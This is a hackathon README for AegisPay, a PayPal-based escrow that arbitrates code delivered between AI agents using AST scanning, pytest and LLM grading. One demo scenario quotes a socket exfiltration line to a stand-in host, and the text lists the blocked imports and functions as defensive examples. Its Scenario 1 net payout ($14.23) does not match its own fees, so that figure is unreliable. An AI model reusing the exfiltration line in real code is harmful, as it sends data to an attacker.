# AegisPay: Autonomous Agent-to-Agent SLA Escrow & Cryptographic Clearinghouse

[![CI](https://github.com/Code-with-Prabhjot/aegispay/actions/workflows/ci.yml/badge.svg)](.github/workflows/ci.yml)
[![Test Suite](https://img.shields.io/badge/Test%20Suite-568%2F568%20Passing%20(100%25)-00C853?style=for-the-badge&logo=pytest&logoColor=white)](tests/)
[![Python](https://img.shields.io/badge/Python-3.12-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Next.js](https://img.shields.io/badge/Next.js-14.2%20(App%20Router)-000000?style=for-the-badge&logo=next.js&logoColor=white)](frontend/)
[![AG Grid Enterprise](https://img.shields.io/badge/AG%20Grid-Enterprise%2032.0-E0234E?style=for-the-badge&logo=ag-grid&logoColor=white)](https://www.ag-grid.com/)
[![PayPal Payments](https://img.shields.io/badge/PayPal-Orders%20v2%20%7C%20Vault%20v3%20%7C%20Payouts-003087?style=for-the-badge&logo=paypal&logoColor=white)](https://developer.paypal.com/)
[![APIMatic](https://img.shields.io/badge/APIMatic-OpenAPI%203.0%20Validated-4353FF?style=for-the-badge&logo=openapi-initiative&logoColor=white)](apimatic/)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=for-the-badge)](LICENSE)

> **AegisPay** is the institutional financial clearinghouse for the autonomous agent economy. It bridges untrusted machine-to-machine interactions through W3C `did:key` Ed25519 cryptographic negotiations, PayPal Orders v2 conditional escrow authorization vaults, air-gapped sandbox execution, deterministic AST and unit test arbitration, multi-model LLM consensus (Gemini 1.5 Flash + Claude 3.5 Sonnet), and integer micro-dollar double-entry settlement.

---

## Table of Contents
1. [Executive Summary & Problem Statement](#executive-summary--problem-statement)
2. [Targeted Prize Track Matrix ($28,000+ Target Yield)](#targeted-prize-track-matrix-28000-target-yield)
3. [System Architecture Diagrams](#system-architecture-diagrams)
   - [3-Way A2A Handshake & Nash Bargaining Flow](#1-3-way-a2a-handshake--nash-bargaining-flow)
   - [15-State Financial FSM & Double-Entry Ledger Topology](#2-15-state-financial-fsm--double-entry-ledger-topology)
   - [7-Leaf Merkle Tree Audit Proof Architecture](#3-7-leaf-merkle-tree-audit-proof-architecture)
4. [Mathematical Formulations](#mathematical-formulations)
   - [Nash Bargaining Utility for SLA Parameter Discovery](#1-nash-bargaining-utility-for-sla-parameter-discovery)
   - [Piecewise Pro-Rata Capture & Automatic Hold Release](#2-piecewise-pro-rata-capture--automatic-hold-release)
   - [Dual-Model LLM Consensus Convergence & Divergence Penalty](#3-dual-model-llm-consensus-convergence--divergence-penalty)
   - [Rolling State Hash Chain Formulation](#4-rolling-state-hash-chain-formulation)
5. [The 6 Immutable Financial & Security Invariants](#the-6-immutable-financial--security-invariants)
6. [Core Microservices & Directory Structure](#core-microservices--directory-structure)
7. [Execution Modes: Mock vs. Sandbox](#execution-modes-mock-vs-sandbox)
8. [Quickstart & Demo Instructions](#quickstart--demo-instructions)
9. [Automated E2E Scenario Runner (3 Test Scenarios)](#automated-e2e-scenario-runner-3-test-scenarios)
10. [Verification & Test Coverage](#verification--test-coverage)
11. [License & Acknowledgments](#license--acknowledgments)

---

## Executive Summary & Problem Statement

As multi-agent AI ecosystems evolve, autonomous agents must hire other specialized agents to write code, perform complex data ETL, or orchestrate API workflows. However, this autonomous economy faces a **fatal trust vacuum**:
- **Buyer Agents face delivery and security risk:** Paying upfront leaves buyers vulnerable to hallucinated code, broken edge cases, or malicious payloads designed to exfiltrate keys.
- **Worker Agents face counterparty non-payment risk:** Delivering work prior to payment allows unscrupulous buyers to consume the work and refuse compensation.
- **Credit card and smart contract rails are ill-suited:** Legacy chargeback mechanisms require weeks of human intervention, whereas raw crypto rails lack native arbitration, cannot evaluate Python/TypeScript AST trees or unit test assertions, and subject agents to gas volatility.

**AegisPay solves this dilemma with "Proof-Before-Payment":**
1. **Autonomous Negotiation:** Buyer and Worker agents negotiate SLA terms (budget, timeout, scope) via Nash Bargaining equilibrium algorithms and seal terms with W3C `did:key` Ed25519 digital signatures.
2. **Conditional Escrow Hold:** Funds are reserved on the buyer's payment method via PayPal Orders v2 (`intent: AUTHORIZE`) and Vaulting v3—funds are locked, never captured prematurely.
3. **Isolated Sandbox Execution:** Worker agents execute within an ephemeral, air-gapped Docker sandbox (`--network none`, read-only rootfs, zero network access, scrubbed environment variables).
4. **Deterministic Multi-Tier Arbitration:** Verification Arbiter executes a static AST security scan (blocking 20/20 known injection vectors), runs the buyer's unalterable test suite (`pytest`), and grades code quality via concurrent Dual-Model LLM Consensus (Gemini 1.5 Flash + Claude 3.5 Sonnet).
5. **Micro-Dollar Settlement:** Depending on the composite score $S \in [0.00, 1.00]$, AegisPay captures 100% of funds, calculates a linear pro-rata capture with automatic hold release of unearned funds, or voids the hold entirely ($0.00 charged). All accounting is settled across a 5-account double-entry ledger with micro-dollar ($10^{-6}\text{ USD}$) integer precision.

---

## Targeted Prize Track Matrix ($28,000+ Target Yield)

AegisPay was architected from Day 1 to achieve top-tier scoring across 6 distinct hackathon prize categories:

| Target Prize Award | Cash Value | Sponsor / Panel Focus | AegisPay Technical Qualification & Implementation Evidence | Repository Source Reference |
| :--- | :--- | :--- | :--- | :--- |
| **1st Place Overall** | **$12,000** | Full Evaluation Panel | Production-grade end-to-end clearinghouse combining live PayPal Sandbox execution, air-gapped Docker sandboxing, dual-model AI arbitration, 568 unit tests, zero floating-point drift, and cryptographic Merkle audit proofs. | Full Repository |
| **Best Use of PayPal + AI** | **$5,000** | PayPal Dev Relations & AI Teams | Deep native integration of 5 PayPal APIs (**Orders v2 Authorize**, **Orders v2 Capture**, **Authorizations Void**, **Vaulting v3**, **Batch Payouts**, **Webhook Verification**) with an adversarial Verification Arbiter combining AST parsing, pytest test runners, and dual LLM consensus. | [`paypal_escrow.py`](backend/app/services/paypal_escrow.py)<br>[`llm_judge.py`](backend/app/services/llm_judge.py)<br>[`routes_webhooks.py`](backend/app/api/routes_webhooks.py)<br>[`vault_service.py`](backend/app/services/vault_service.py) |
| **Best Use of Agentic Commerce** | **$5,000** | PayPal Agentic Commerce PMs | Machine-to-machine SLA parameter negotiation via Nash Bargaining utility, W3C `did:key` Ed25519 asymmetric cryptography, autonomous re-authorization sweeper, and complete elimination of human mediation in micro-work disputes. | [`a2a.py`](backend/app/services/a2a.py)<br>[`orchestrator.py`](backend/app/services/orchestrator.py)<br>[`sweeper.py`](backend/app/services/sweeper.py) |
| **Best AG Grid Implementation** | **$5,000** | AG Grid Community & Engineering | Mission Control Financial Workstation powered by **AG Grid Enterprise (`ag-grid-react`)**. Features Master-Detail hierarchical rows (expanding to reveal live double-entry journal lines, 7-leaf Merkle proofs, AST syntax trees, test assertion matrices), real-time cell flashing (`enableCellChangeFlash`), micro-dollar formatters, CSV audit exports, and 60fps WebSocket state synchronization. | [`EscrowLedgerGrid.tsx`](frontend/src/components/EscrowLedgerGrid.tsx)<br>[`dashboard/page.tsx`](frontend/src/app/dashboard/page.tsx) |
| **Best Demo Delivery** | **$5,000** | Hackathon Judging Panel | Fully automated E2E demo runner (`scripts/run_demo_scenarios.py`) driving 3 distinct scenarios (Clean Pass, Partial Defect, Malicious Code Injection), visual interactive Code Mutation Studio, Settlement Simulator, and zero-unbacked-claims evidence base. | [`run_demo_scenarios.py`](scripts/run_demo_scenarios.py)<br>[`CodeMutationStudio.tsx`](frontend/src/components/CodeMutationStudio.tsx)<br>[`Landing.tsx`](frontend/src/components/landing/Landing.tsx) |
| **APIMatic SDK Track** | **$1,000** | APIMatic Engineering | Complete OpenAPI 3.0 contract specification, validated through APIMatic's Context validation engine, ensuring zero contract drift across all nested PayPal v2 order and payout structures. | [`apimatic/`](apimatic/)<br>[`test_apimatic_contract.py`](tests/test_apimatic_contract.py) |

**Total Target Opportunity: $28,000+ ($33,000 potential pool)**

---

## System Architecture Diagrams

### 1. 3-Way A2A Handshake & Nash Bargaining Flow

```
   [BUYER AGENT]                               [AEGISPAY CLEARINGHOUSE]                               [WORKER AGENT]
  (Ed25519 did:key)                                  (Orchestrator)                                 (Ed25519 did:key)
         │                                                 │                                                 │
         │─── 1. SLA Proposal (Budget, Timeout, Prefs) ───▶│◀── 2. SLA Offer (Min Budget, Capability, Prefs) ──│
         │                                                 │                                                 │
         │                                     [Nash Bargaining Solver]                                      │
         │                              Maximize: U_Buyer(B,T) * U_Worker(B,T)                               │
         │                               Analytical Equilibrium: (B*, T*)                                    │
         │                                                 │                                                 │
         │◀─────────── 3. Synthesized SLA Contract Offer (B*, T*, Task Hash, Test Suite Hash) ───────────────▶│
         │                                                 │                                                 │
         │─── 4. Ed25519 Counter-Signature ───────────────▶│                                                 │
         │                                                 │◀─── 5. Ed25519 Counter-Signature ───────────────│
         │                                                 │                                                 │
         │                                      [Cryptographic Seal]                                         │
         │                                 Verify Both Signatures via W3C did:key                            │
         │                                                 │                                                 │
         │                             [PayPal Orders v2: intent="AUTHORIZE"]                                │
         │                                  Lock B* Micro-Dollars in Escrow                                  │
         │                                                 │                                                 │
         │◀──────── 6. Escrow Locked (Auth ID) ───────────┴────────── 7. Dispatch Execution Order ──────────▶│
         │                                                                                                   │
         │                                                                   [Air-Gapped Docker Execution]   │
         │                                                                   --network none, read-only root  │
         │                                                                                   │               │
         │                                                 │◀── 8. Submit Deliverable Source Code ───────────│
         │                                                 │                                                 │
         │                                     [Deterministic Arbiter]                                       │
         │                                     - AST Static Security Veto                                    │
         │                                     - Pytest Assertion Matrix                                     │
         │                                     - Dual LLM (Gemini + Claude)                                  │
         │                                                 │                                                 │
         │                                   [Micro-Dollar Settlement]                                       │
         │                                   - Capture C(S) via PayPal                                       │
         │                                   - Release Remainder R(S) to Buyer                               │
         │                                   - Batch Payout Net to Worker                                    │
         │                                                 │                                                 │
         │◀──────── 9. Automatic Hold Release (R) ─────────┴───────── 10. Instant Payout Dispatched (Net) ──▶│
```

---

### 2. 15-State Financial FSM & Double-Entry Ledger Topology

AegisPay governs every escrow lifecycle through a mathematically complete, 15-state Finite State Machine (FSM) backed by strict double-entry ledger postings:

```
                                [1. AGREEMENT_DRAFTED]
                                          │
                        (Buyer & Worker sign Ed25519 SLA Contract)
                                          ▼
                                [2. PAYPAL_AUTH_LOCKED]
                 (PayPal Orders v2 intent="AUTHORIZE" locks funds)
                 Ledger: Debit buyer_vault -> Credit paypal_escrow_hold
                                          │
            ┌─────────────────────────────┴─────────────────────────────┐
            │ (>72h Expiry / Vault Lockout)                             │ (Within 72h Window)
            ▼                                                           ▼
    [3. AUTH_EXPIRED]                                         [4. SANDBOX_EXECUTING]
   (Terminal: Hold Expired)                                  (Worker runs in Docker)
                                                                        │
                                                                        ▼
                                                            [5. ARBITRATION_AUDITING]
                                                           (AST + Pytest + Dual LLM)
                                                                        │
         ┌───────────────────────────────────────┬──────────────────────┴───────────────────────────────────────┐
         │ (Score S >= 0.90)                     │ (0.60 <= Score S < 0.90)                                     │ (Score S < 0.60 OR AST Veto)
         ▼                                       ▼                                                              ▼
[6. FULL_CAPTURE_PENDING]             [7. PARTIAL_CAPTURE_PENDING]                                             [8. VOID_PENDING]
(Capture 100% of Agreed B*)           (Capture C(S); PayPal Auto-releases R(S))                                (Call PayPal Authorizations Void)
         │                                       │                                                              │
         ├──────────────────┐                    ├──────────────────┐                                           ▼
         │ (201 Created)    │ (Declined)         │ (201 Created)    │ (Declined)                   [12. ESCROW_VOIDED_REFUNDED]
         ▼                  ▼                    ▼                  ▼                              (Terminal: 100% Released to Buyer)
[9. PAYPAL_CAPTURED] [11. CAPTURE_DECLINED] [10. PARTIAL_CAPTURED]  │                              Ledger: Debit paypal_escrow_hold
         │           (Halt Payout / Alert)       │                  │                                      -> Credit buyer_vault
         └──────────────────┬────────────────────┘                  │
                            │ ┌─────────────────────────────────────┘
                            ▼ ▼
                  [13. PAYOUT_DISPATCHED]
       (PayPal Batch Payouts API -> Worker Account)
       Ledger: Debit paypal_escrow_hold
               -> Credit worker_payable (Net)
               -> Credit platform_fee_revenue (5%)
               -> Credit paypal_rail_expense ($0.25)
                            │
            ┌───────────────┴───────────────┐
            │ (Webhook: ITEM.SUCCEEDED)     │ (Webhook: ITEM.FAILED)
            ▼                               ▼
 [14. SETTLED_COMPLETE]          [15. PAYOUT_FAILED_REVERSED]
 (Terminal: Fully Balanced)       (Re-credits Escrow Reserve for Retry)
```

#### Double-Entry Ledger Account Heads
1. `buyer_vault`: Pre-funded or vaulted customer balance held for autonomous authorization.
2. `paypal_escrow_hold`: Active funds locked under a PayPal authorization hold.
3. `worker_payable`: Net verified earnings allocated to the worker agent for disbursement.
4. `platform_fee_revenue`: 5.00% protocol fee collected upon verified settlement.
5. `paypal_rail_expense`: Fixed $0.25 PayPal Batch Payout transaction fee.

---

### 3. 7-Leaf Merkle Tree Audit Proof Architecture

To guarantee verifiable, non-repudiable post-settlement audits without exposing private code or keys on public networks, AegisPay hashes every arbitration artifact into a cryptographic 7-Leaf Merkle Tree (padded to 8 leaves for balanced binary geometry):

```
                                  [MERKLE ROOT H_ROOT]
                                     Level 3 (Root)
                                            │
                    ┌───────────────────────┴───────────────────────┐
                    │                                               │
             [Node H_0123]                                   [Node H_4567]
             Level 2 Parent                                  Level 2 Parent
                    │                                               │
          ┌─────────┴─────────┐                           ┌─────────┴─────────┐
          │                   │                           │                   │
     [Node H_01]         [Node H_23]                 [Node H_45]         [Node H_67]
    Level 1 Parent      Level 1 Parent              Level 1 Parent      Level 1 Parent
          │                   │                           │                   │
     ┌────┴────┐         ┌────┴────┐                 ┌────┴────┐         ┌────┴────┐
     │         │         │         │                 │         │                 │
  [LEAF 0]  [LEAF 1]  [LEAF 2]  [LEAF 3]          [LEAF 4]  [LEAF 5]          [LEAF 6]  [LEAF 6 (Padded)]
```

#### The 7 Cryptographic Audit Leaves
- **Leaf 0 (`leaf_0`):** Canonical SLA Contract JSON, Task Description, and Dual Ed25519 Signatures.
- **Leaf 1 (`leaf_1`):** PayPal Authorization ID, Order ID, and Webhook Receipts.
- **Leaf 2 (`leaf_2`):** Air-Gapped Sandbox Raw `stdout` and `stderr` Execution Logs.
- **Leaf 3 (`leaf_3`):** AST Static Analysis Syntax Tree, Import Whitelist, and Security Safety Score.
- **Leaf 4 (`leaf_4`):** Pytest / Vitest Structured JSON Execution Assertion Matrix (Pass/Fail/Duration).
- **Leaf 5 (`leaf_5`):** Dual-LLM Semantic Consensus Transcripts (Gemini 1.5 Flash + Claude 3.5 Sonnet Rationale).
- **Leaf 6 (`leaf_6`):** Double-Entry Financial Journal Lines ($\sum\text{Debits} \equiv \sum\text{Credits}$).

---

## Mathematical Formulations

### 1. Nash Bargaining Utility for SLA Parameter Discovery

When an autonomous Buyer Agent and Worker Agent meet, their utility functions over contract budget $B$ (in micro-dollars) and execution deadline $T$ (in seconds) are represented as:

$$\mathcal{U}_{\text{Buyer}}(B, T) = \alpha \left(1 - \frac{B}{B_{\max}}\right) + (1 - \alpha) \left(1 - \frac{T}{T_{\max}}\right)$$

$$\mathcal{U}_{\text{Worker}}(B, T) = \beta \left(\frac{B}{B_{\max}}\right) + (1 - \beta) \left(1 - \frac{T}{T_{\max}}\right)$$

Where:
- $B \in [B_{\min}, B_{\max}]$ and $T \in [T_{\min}, T_{\max}]$.
- $\alpha \in (0, 1)$ is the Buyer's price sensitivity versus delivery urgency.
- $\beta \in (0, 1)$ is the Worker's margin requirement versus execution speed.

AegisPay solves the Nash Bargaining Product objective:

$$\max_{B, T} \; \Omega(B, T) = \mathcal{U}_{\text{Buyer}}(B, T) \times \mathcal{U}_{\text{Worker}}(B, T)$$

Subject to individual rationality bounds: $\mathcal{U}_{\text{Buyer}} \ge 0$ and $\mathcal{U}_{\text{Worker}} \ge 0$. The analytical budget equilibrium $x^* = \frac{B^*}{B_{\max}}$ is derived as:

$$x^* = 0.50 + \frac{(\beta - \alpha)\left(1 - \frac{T^*}{T_{\max}}\right)}{2\alpha\beta}$$

---

### 2. Piecewise Pro-Rata Capture & Automatic Hold Release

The Verification Arbiter computes a composite verification score $S \in [0.00, 1.00]$:

$$S = 0.50 \cdot S_{\text{pytest}} + 0.25 \cdot S_{\text{ast\_security}} + 0.25 \cdot S_{\text{llm\_rubric}}$$

> **AST Hard Veto Rule:** If the static AST security scanner detects any forbidden import or dangerous call, $S_{\text{ast\_security}} \leftarrow 0.00$, immediately locking $S \leftarrow 0.00$.

The captured amount $C(S)$ in integer micro-dollars is governed by the piecewise linear function:

$$
C(S) = \begin{cases} 
B_{\text{agreed}} & \text{if } S \ge 0.90 \quad \text{(Full Settlement)} \\[8pt]
\left\lfloor \frac{B_{\text{agreed}} \cdot \left(0.50 + 0.40 \cdot \left(\frac{S - 0.60}{0.30}\right)\right)}{10,000} \right\rfloor \times 10,000 & \text{if } 0.60 \le S < 0.90 \quad \text{(Pro-Rata Partial Capture)} \\[8pt]
0 & \text{if } S < 0.60 \quad \text{(Complete Authorization Void — \$0.00 Captured)}
\end{cases}
$$

The unearned escrow balance $R(S) = B_{\text{agreed}} - C(S)$ is **automatically released to the buyer** by PayPal because AegisPay sets `final_capture: true` on the PayPal capture request.

---

### 3. Dual-Model LLM Consensus Convergence & Divergence Penalty

To eliminate single-LLM hallucination or grading bias, AegisPay runs **Google Gemini 1.5 Flash** and **Anthropic Claude 3.5 Sonnet** in concurrent asynchronous threads:

Let $S_{\text{Gemini}} \in [0.0, 1.0]$ and $S_{\text{Claude}} \in [0.0, 1.0]$ be the individual model grades. The divergence is:

$$\Delta = |S_{\text{Gemini}} - S_{\text{Claude}}|$$

The consensus score $S_{\text{consensus}}$ enforces conservative risk protection:

$$
S_{\text{consensus}} = \begin{cases}
\frac{S_{\text{Gemini}} + S_{\text{Claude}}}{2} & \text{if } \Delta \le 0.15 \quad \text{(Convergence Zone)} \\[8pt]
\min(S_{\text{Gemini}}, S_{\text{Claude}}) \times 0.90 & \text{if } \Delta > 0.15 \quad \text{(Conservative Divergence Penalty)}
\end{cases}
$$

If either model fails or times out, the system automatically degrades gracefully to the deterministic AST + docstring rubric without halting the financial pipeline.

---

### 4. Rolling State Hash Chain Formulation

Every lifecycle event $n$ is cryptographically chained to its predecessor, guaranteeing audit immutability:

- **Genesis Hash ($H_0$):**
  $$H_0 = \text{SHA-256}(\text{"AEGISPAY\_GENESIS:"} \parallel \text{agreement\_id})$$

- **Transition Hash ($H_n$):**
  $$H_n = \text{SHA-256}(H_{n-1} \parallel \text{timestamp} \parallel \text{fsm\_state} \parallel \text{canonical\_json}(\text{payload}))$$

Any alteration of previous ledger balances, authorization IDs, or FSM timestamps breaks the chain at step $n$, immediately failing `verify_hash_chain()`.

---

## The 6 Immutable Financial & Security Invariants

AegisPay guarantees six immutable system invariants verified by automated high-concurrency stress tests:

1. **Conservation of Balance:**  
   $$\sum \text{Debits} \equiv \sum \text{Credits}$$
   Every transaction balance delta satisfies total equality. Money can neither be created from nothing nor silently vanish. Account balances are strictly non-negative.
2. **Micro-Dollar Integer Precision:**  
   All internal math operates strictly in 64-bit integer micro-dollars ($1\text{ USD} = 1,000,000\text{ micros}$, $1\text{ cent} = 10,000\text{ micros}$). IEEE 754 floating-point rounding errors and sub-cent drift are mathematically impossible.
3. **Strict Idempotency:**  
   Every mutating external call to PayPal (`authorize`, `capture`, `void`, `payout`) derives a deterministic UUIDv5 request identifier:
   $$\text{PayPal-Request-Id} = \text{UUID5}(\text{NAMESPACE\_DNS}, \text{"aegispay:"} \parallel \text{agreement\_id} \parallel \text{":"} \parallel \text{action} \parallel \text{":v"} \parallel \text{step})$$
   Network retries, duplicate webhooks, or concurrent submissions never cause double capture or double disbursement.
4. **Air-Gapped Sandboxing:**  
   Worker agent code executes within rootless Docker containers configured with `--network none`, `--read-only`, capped memory (256MB), capped tmpfs (64MB), and dropped privileges (`no-new-privileges: true`). All host environment variables and PayPal credentials are scrubbed.
5. **AST Hard Veto:**  
   Static abstract syntax tree analysis audits all submitted code for blacklisted imports (`os`, `sys`, `subprocess`, `socket`, `importlib`, `pickle`, `ctypes`, `shutil`) and dangerous functions (`eval`, `exec`, `__import__`, `compile`). Any violation immediately locks $S_{\text{ast\_security}} \leftarrow 0.00$, aborts sandbox execution, and voids 100% of the authorization hold.
6. **Zero Silent Authorization Leaks:**  
   PayPal authorizations expire after 72 hours. An automated background Sweeper daemon monitors expiring holds at the 70-hour mark, automatically re-authorizing using vaulted buyer payment tokens (`payment_source.paypal.vault_id`) or releasing the hold before expiration.

---

## Core Microservices & Directory Structure

```
AegisPay/
├── apimatic/                          # APIMatic OpenAPI 3.0 Specs & Validation Rules
│   └── aegispay_openapi.json
├── backend/                           # High-Performance FastAPI Python Backend
│   ├── app/
│   │   ├── api/                       # API Routes (Contracts, Settlement, Webhooks, Sweeper)
│   │   │   ├── routes_contracts.py
│   │   │   ├── routes_demo.py
│   │   │   └── routes_webhooks.py
│   │   ├── db.py                      # SQLite WAL / PostgreSQL Repository Layer
│   │   ├── main.py                    # FastAPI Application & WebSocket Hub
│   │   ├── schemas.py                 # Pydantic v2 Models & FSM State Enums
│   │   └── services/                  # Core Clearinghouse Microservices
│   │       ├── a2a.py                 # Ed25519 W3C did:key Protocol & Nash Bargaining
│   │       ├── arbitration_engine.py  # AST Scanner, Pytest Runner & Scoring
│   │       ├── fsm.py                 # 15-State Financial Finite State Machine
│   │       ├── ledger_service.py      # Double-Entry Accounting Engine
│   │       ├── llm_judge.py           # Dual-Model Consensus (Gemini + Claude)
│   │       ├── merkle_audit.py        # 7-Leaf Merkle Tree & State Hash Chains
│   │       ├── orchestrator.py        # Master Escrow & Settlement Orchestrator
│   │       ├── paypal_escrow.py       # Live PayPal Orders v2 & Payouts Engine
│   │       ├── paypal_mock.py         # Offline Deterministic Mock PayPal Engine
│   │       ├── sweeper.py             # 72-Hour Re-Authorization & Vault Sweeper
│   │       └── vault_service.py       # PayPal Vaulting v3 Customer Token Vault
│   └── db/
│       └── schema.sql                 # Production PostgreSQL-Compatible DDL
├── frontend/                          # Next.js 14 Mission Control Dashboard
│   ├── src/
│   │   ├── app/
│   │   │   ├── dashboard/page.tsx     # AG Grid Mission Control Operations Center
│   │   │   └── page.tsx               # Interactive Landing & Settlement Simulator
│   │   └── components/
│   │       ├── CodeMutationStudio.tsx # Live AST Adversarial Code Injector
│   │       ├── DualModelConsensusGauge.tsx # Gemini vs Claude Visual Agreement Gauge
│   │       ├── EscrowLedgerGrid.tsx   # AG Grid Enterprise Master-Detail Ledger
│   │       └── VaultManagementModal.tsx # PayPal Vaulting v3 Allowance Controller
├── scripts/
│   └── run_demo_scenarios.py          # Automated E2E 3-Scenario Terminal Runner
└── tests/                             # 568 Automated Test Specifications
    ├── test_a2a_and_merkle.py
    ├── test_apimatic_contract.py
    ├── test_ast_security_matrix.py    # 20-Vector AST Injection Attack Matrix
    ├── test_concurrency_stress.py     # 50-Thread High Concurrency Stress Suite
    ├── test_consensus_and_mcp.py
    └── test_settlement_math.py        # Micro-Dollar Mathematical Invariants
```

---

## Execution Modes: Mock vs. Sandbox

AegisPay is engineered with dual-mode operational transparency, ensuring deterministic evaluations for hackathon judges while maintaining full production readiness against PayPal's live developer infrastructure:

1. **Deterministic Mock Mode (`PAYPAL_MODE=mock` — Default):**
   - Enabled out-of-the-box in `.env.example` (`PAYPAL_MODE=mock`).
   - Allows hackathon judges, automated CI runners, and peer evaluators to execute instantaneous, deterministic 0-dependency tests without network flakiness, rate limits, or external credential setup.
   - Generates deterministic simulated PayPal IDs adhering strictly to PayPal Orders v2 (`fake-auth-...`), Payments v2 (`fake-cap-...`, `fake-void-...`), and Batch Payouts v1 (`fake-payout-...`) schemas.
   - Powers all 568 automated unit, integration, and security tests with 100% green pass rate.

2. **Live PayPal Sandbox Platform (`PAYPAL_MODE=sandbox`):**
   - Flipping `PAYPAL_MODE=sandbox` and inserting standard `PAYPAL_CLIENT_ID` and `PAYPAL_CLIENT_SECRET` in `.env` binds AegisPay directly to the live PayPal developer platform (`https://api-m.sandbox.paypal.com`).
   - Conducts genuine OAuth2 `client_credentials` exchanges, authentic authorization reservations, partial captures, void releases, and batch mass payouts.
   - **Diagnostic Verification:** Evaluators can inspect and verify live PayPal Sandbox connectivity at any time using our built-in diagnostic tool:
     ```bash
     python scripts/verify_paypal_sandbox.py
     ```

---

## Quickstart & Demo Instructions

### 1. Prerequisites
- **Python:** 3.12+
- **Node.js:** 18.0+ & npm 9+
- **Docker:** Optional (Required for live air-gapped sandboxing; fallback mock runner included for offline evaluation)

### 2. Backend Setup
```bash
# Clone the repository
git clone https://github.com/Code-with-Prabhjot/aegispay.git
cd aegispay

# Create and activate virtual environment
python -m venv .venv
source .venv/bin/activate       # On Windows: .venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt -r requirements-dev.txt

# Copy environment configuration
cp .env.example .env

# Run FastAPI backend in offline mock mode (or wire live PayPal Sandbox credentials in .env)
uvicorn backend.app.main:app --host 0.0.0.0 --port 8000 --reload
```
The backend API documentation is immediately available at `http://localhost:8000/docs`.

### 3. Frontend Setup
```bash
# In a new terminal window
cd frontend

# Install frontend dependencies
npm install

# Start Next.js development server
npm run dev
```
The Mission Control Dashboard opens at `http://localhost:3000/dashboard`.

---

## Automated E2E Scenario Runner (3 Test Scenarios)

AegisPay includes a turnkey automated scenario runner (`scripts/run_demo_scenarios.py`) that executes three complete real-world contracts through the backend while streaming real-time WebSocket events to the AG Grid Mission Control dashboard:

```bash
# Run all three scenarios sequentially with 2.5s delay between transitions
python scripts/run_demo_scenarios.py --scenario all --delay 2.5 --base-url http://localhost:8000
```

### Scenario Breakdown

#### Scenario 1: Clean Pass (Full $15.00 Capture | $S = 0.96$)
- **Task:** Token Bucket Rate Limiter with burst capacity and background replenishment.
- **Worker Submission:** 100% compliant Python implementation with complete docstrings and typing.
- **Arbitration Results:** 10/10 unit tests pass ($S_{\text{pytest}} = 1.0$), AST scan clean ($S_{\text{ast}} = 1.0$), dual-model consensus $S_{\text{llm}} = 0.84$.
- **Financial Outcome:** Composite score $S = 0.96 \ge 0.90 \implies$ **Full Capture** of $\$15.00$ ($15,000,000\text{ micros}$). $\$0.75$ platform fee, $\$0.25$ rail fee, $\$14.23$ net disbursed to worker.

#### Scenario 2: Partial Defect (Pro-Rata Settlement $10.50 / $4.50 | $S = 0.75$)
- **Task:** Token Bucket Rate Limiter with edge-case handling.
- **Worker Submission:** Working code with subtle state flaws (fails burst ceiling clamp and client reset tests).
- **Arbitration Results:** 7/10 unit tests pass ($S_{\text{pytest}} = 0.70$), AST scan clean ($S_{\text{ast}} = 1.0$), semantic score $S_{\text{llm}} = 0.60$.
- **Financial Outcome:** Composite score $S = 0.75 \implies$ Pro-rata factor $0.70$. AegisPay captures **$\$10.50$** ($70\%$), and PayPal **automatically releases $\$4.50$ ($30\%$) uncaptured escrow back to the buyer**.

#### Scenario 3: Malicious Injection (Static AST Hard Veto | $0.00 Charged)
- **Task:** Deliverable attempting covert socket exfiltration (`import socket; socket.connect(('evil.com', 80))`).
- **Arbitration Results:** Static AST visitor intercepts forbidden import `socket`. **AST Hard Veto triggers immediately**.
- **Financial Outcome:** Composite score $S$ locked to **$0.00$**. Host execution is aborted. AegisPay invokes PayPal `void_authorization`, releasing $100\%$ ($\$15.00$) of held funds back to the buyer. **Zero dollars charged**.

---

## Verification & Test Coverage

The entire AegisPay codebase is hardened by **568 passing automated tests** (with `requirements-dev.txt` installed) with zero failures or skipped assertions:

```bash
# Execute complete test suite
.venv\Scripts\pytest tests/ -q
# Output: 568 passed, 1 warning
```

### Key Test Suites
- `tests/test_ast_security_matrix.py`: Verifies that all 20 malicious AST injection attack vectors (shell commands, dynamic reflection, obfuscated imports, socket creation) trigger an immediate hard veto.
- `tests/test_settlement_math.py`: Validates micro-dollar rounding, boundary conditions at $S=0.60, 0.90$, and fee deductions across 24,000 generated amounts.
- `tests/test_concurrency_stress.py`: Verifies double-entry balance conservation ($\sum\text{Debits} \equiv \sum\text{Credits}$) across 50 concurrent settlement threads and 20 duplicate webhook storms.
- `tests/test_apimatic_contract.py`: Proves strict adherence and zero schema drift against APIMatic OpenAPI 3.0 models.

---

## License & Acknowledgments

This project is licensed under the **Apache License, Version 2.0**. See the [LICENSE](LICENSE) file for details.

Developed with pride for the **PayPal AI Hackathon 2026** by **Team AegisPay**. Powered by PayPal Developer APIs, AG Grid Enterprise, Anthropic Claude, Google Gemini, and APIMatic.
